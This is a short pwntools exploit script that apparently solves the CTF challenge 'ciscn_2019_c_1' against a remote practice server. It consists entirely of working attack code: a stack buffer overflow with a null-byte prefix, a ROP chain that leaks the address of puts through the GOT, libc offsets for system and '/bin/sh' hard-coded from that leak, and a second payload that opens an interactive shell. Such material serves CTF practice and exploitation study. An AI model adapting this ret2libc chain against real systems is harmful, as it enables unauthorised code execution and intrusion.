from pwn import *
from LibcSearcher import LibcSearcher

#sh = process("./ciscn_2019_c_1")
sh = remote("node5.buuoj.cn",26717)
elf = ELF("./ciscn_2019_c_1")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_got = elf.got["__libc_start_main"]
main = elf.symbols["main"]
encrypt = 0x04009A0
pop_rdi = 0x0400c83
#pop_ret =0x0004007f0
ret = 0x04006b9

sh.sendline(str(1))

payload1=b"\0"+b"a"*0x57+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)
sh.sendlineafter(b"Input your choice!",payload1)
puts_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
print("puts_addr="+hex(puts_addr))

#libc = LibcSearcher("_puts",puts_addr)
#libcbase = libc - libc.dump("_puts")
system_addr = puts_addr - 0x31580
binsh_addr = puts_addr + 0x1334da
payload2 = b"\0"+b"a"*0x57+p64(pop_rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)
sh.recvuntil("encrypted\n")
sh.sendline(payload2)
sh.interactive()
